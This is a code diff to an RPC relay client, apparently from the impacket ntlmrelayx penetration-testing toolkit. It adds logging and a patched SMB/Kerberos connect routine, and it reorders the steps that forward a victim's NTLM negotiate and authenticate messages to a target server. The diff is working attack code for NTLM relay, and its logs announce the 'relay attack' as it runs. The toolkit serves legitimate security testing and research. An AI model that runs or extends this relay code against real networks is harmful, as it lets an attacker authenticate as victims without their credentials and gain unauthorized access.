@@ -125,6 +125,7 @@ class RPCRelayClient(ProtocolClient):
     PLUGIN_NAME = "RPC"
 
     def __init__(self, serverConfig, target, targetPort=None, extendedSecurity=True):
+        LOG.info("RPC Relay: Creating RPC client for target %s" % target.netloc)
         ProtocolClient.__init__(self, serverConfig, target, targetPort, extendedSecurity)
 
         # TODO: support relaying RPC to different endpoints (e.g. DCOM, SpoolSS)
@@ -150,18 +151,75 @@ class RPCRelayClient(ProtocolClient):
             self.stringbinding = epm.hept_map(target.netloc, self.endpoint_uuid, protocol='ncacn_ip_tcp')
 
         LOG.debug("%s stringbinding is %s" % (self.endpoint, self.stringbinding))
+        LOG.info("RPC Relay: RPC client constructor completed successfully")
 
     def initConnection(self):
+        LOG.info("RPC Relay: initConnection called for target %s" % self.stringbinding)
+        
+        # Just set up the transport but don't connect yet - that happens in sendNegotiate
         rpctransport = transport.DCERPCTransportFactory(self.stringbinding)
 
         if self.serverConfig.rpc_use_smb:
-            LOG.info("Authenticating to smb://%s:%d with creds provided in cmdline" % (self.target.netloc, self.serverConfig.rpc_smb_port))
+            LOG.debug("RPC Relay: Setting up SMB transport credentials")
             rpctransport.set_credentials(self.serverConfig.smbuser, self.serverConfig.smbpass, self.serverConfig.smbdomain, \
                 self.serverConfig.smblmhash, self.serverConfig.smbnthash)
             rpctransport.set_dport(self.serverConfig.rpc_smb_port)
+            
+            # Enable Kerberos if requested
+            if self.serverConfig.kerberos:
+                LOG.debug("RPC Relay: Enabling Kerberos for SMB transport")
+                rpctransport.set_kerberos(True)
+                
+                # Patch the SMBTransport connect method to force useCache=False
+                original_connect = rpctransport.connect
+                def patched_connect():
+                    LOG.debug("RPC Relay: Patched connect method called")
+                    # Check if we have a smb connection already setup
+                    if rpctransport._SMBTransport__smb_connection == 0:
+                        LOG.debug("RPC Relay: Setting up SMB connection")
+                        rpctransport.setup_smb_connection()
+                        if rpctransport._doKerberos is False:
+                            LOG.debug("RPC Relay: Using NTLM authentication")
+                            rpctransport._SMBTransport__smb_connection.login(rpctransport._username, rpctransport._password, rpctransport._domain, rpctransport._lmhash, rpctransport._nthash)
+                        else:
+                            # Call kerberosLogin with useCache=False to force command-line credentials
+                            LOG.info("Forcing useCache=False for Kerberos authentication")
+                            rpctransport._SMBTransport__smb_connection.kerberosLogin(
+                                rpctransport._username, rpctransport._password, rpctransport._domain, 
+                                rpctransport._lmhash, rpctransport._nthash, rpctransport._aesKey, 
+                                kdcHost=rpctransport._kdcHost, TGT=rpctransport._TGT, TGS=rpctransport._TGS, 
+                                useCache=False
+                            )
+                    LOG.debug("RPC Relay: Connecting to IPC$ tree")
+                    rpctransport._SMBTransport__tid = rpctransport._SMBTransport__smb_connection.connectTree('IPC$')
+                    LOG.debug("RPC Relay: Opening pipe %s" % rpctransport._SMBTransport__filename)
+                    rpctransport._SMBTransport__handle = rpctransport._SMBTransport__smb_connection.openFile(rpctransport._SMBTransport__tid, rpctransport._SMBTransport__filename)
+                    rpctransport._SMBTransport__socket = rpctransport._SMBTransport__smb_connection.getSMBServer().get_socket()
+                    LOG.debug("RPC Relay: SMB transport setup complete")
+                    return 1
+                
+                rpctransport.connect = patched_connect
 
+        LOG.debug("RPC Relay: Creating RPC session (not connecting yet)")
         self.session = MYDCERPC_v5(rpctransport)
         self.session.set_auth_level(RPC_C_AUTHN_LEVEL_CONNECT)
+        
+        # Store the transport for later use
+        self.rpctransport = rpctransport
+        
+        LOG.info("RPC Relay: initConnection completed - ready for relay")
+        return True
+
+    def sendNegotiate(self, auth_data):
+        LOG.info("RPC Relay: sendNegotiate called - victim sending NTLM Type 1, relay starting!")
+        
+        # Now is the time to establish the connection to the target
+        if self.serverConfig.rpc_use_smb:
+            LOG.info("Authenticating to smb://%s:%d with creds provided in cmdline" % (self.target.netloc, self.serverConfig.rpc_smb_port))
+            if self.serverConfig.kerberos:
+                LOG.info("Using Kerberos authentication for SMB")
+        
+        # Connect the session (this will trigger the Kerberos authentication if configured)
         self.session.connect()
 
         if self.serverConfig.rpc_use_smb:
@@ -169,34 +227,44 @@ class RPCRelayClient(ProtocolClient):
             LOG.info("Authentication to smb://%s:%d succeeded" % (self.target.netloc, self.serverConfig.rpc_smb_port))
         else:
             self.session.set_auth_level(RPC_C_AUTHN_LEVEL_CONNECT)
+        
+        # Final connection setup
         self.session.connect()
-
-        return True
-
-    def sendNegotiate(self, auth_data):
+        
+        # Now send the victim's NTLM Type 1 message to the target
+        LOG.debug("RPC Relay: Sending victim's NTLM Type 1 to target %s" % self.stringbinding)
         bindResp = self.session.sendBindType1(self.endpoint_uuid, auth_data)
 
         challenge = NTLMAuthChallenge()
         challenge.fromString(bindResp['auth_data'])
 
+        LOG.debug("RPC Relay: Received NTLM challenge from target, relaying back to victim")
+        
         return challenge
 
     def sendAuth(self, authenticateMessageBlob, serverChallenge=None):
+        LOG.info("RPC Relay: sendAuth called - victim sending NTLM Type 3, completing relay attack!")
+        
         if unpack('B', authenticateMessageBlob[:1])[0] == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:
             respToken2 = SPNEGO_NegTokenResp(authenticateMessageBlob)
             auth_data = respToken2['ResponseToken']
         else:
             auth_data = authenticateMessageBlob
 
+        LOG.debug("RPC Relay: Sending victim's NTLM Type 3 to target %s" % self.stringbinding)
         self.session.sendBindType3(auth_data)
 
+        LOG.debug("RPC Relay: Testing relay success with dummy RPC call")
         try:
             req = DummyOp()
             self.session.request(req)
+            LOG.debug("RPC Relay: Relay attack completed successfully!")
         except DCERPCException as e:
             if 'nca_s_op_rng_error' in str(e) or 'RPC_E_INVALID_HEADER' in str(e):
+                LOG.debug("RPC Relay: Relay completed successfully (expected error): %s" % str(e))
                 return None, STATUS_SUCCESS
             elif 'rpc_s_access_denied' in str(e):
+                LOG.debug("RPC Relay: Access denied - relay failed: %s" % str(e))
                 return None, STATUS_ACCESS_DENIED
             else:
                 LOG.info("Unexpected rpc code received from %s: %s" % (self.stringbinding, str(e)))
